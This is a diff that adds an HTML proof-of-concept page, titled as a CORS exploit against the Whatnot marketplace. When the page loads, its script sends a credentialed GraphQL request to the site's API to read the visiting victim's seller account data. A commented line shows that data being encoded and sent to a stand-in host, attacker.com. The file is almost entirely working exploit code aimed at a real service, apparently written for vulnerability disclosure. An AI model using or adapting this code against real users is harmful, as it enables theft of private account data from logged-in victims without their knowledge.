@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS PoC - Whatnot</title></head>
+<body>
+<h1>CORS PoC - Whatnot Authenticated Data Theft</h1>
+<h3>Stolen Data:</h3>
+<pre id="output">Fetching victim data...</pre>
+<script>
+function exploit() {
+  fetch("https://www.whatnot.com/services/graphql/?operationName=GetSellerLiveReadiness&ssr=0", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+      "Content-Type": "application/json",
+      "x-whatnot-app": "whatnot-web",
+      "x-whatnot-app-context": "next-js/browser",
+      "x-whatnot-app-version": "20260317-1859"
+    },
+    body: JSON.stringify({
+      operationName: "GetSellerLiveReadiness",
+      variables: {},
+      query: `query GetSellerLiveReadiness{me{id sellerLiveReadinessState{firstScheduledShow{uuid title scheduledAt __typename}completedChecklistAt overviewStatus scheduleShowStatus addProductsStatus bringInBuyersStatus goLiveStatus __typename}__typename}}`
+    })
+  })
+  .then(r => r.json())
+  .then(data => {
+    document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+    // In real attack - send to attacker server:
+    // fetch("https://attacker.com/steal?data=" + btoa(JSON.stringify(data)))
+  })
+  .catch(e => {
+    document.getElementById("output").innerText = "Error: " + e;
+  });
+}
+exploit();
+</script>
+</body>
+</html>
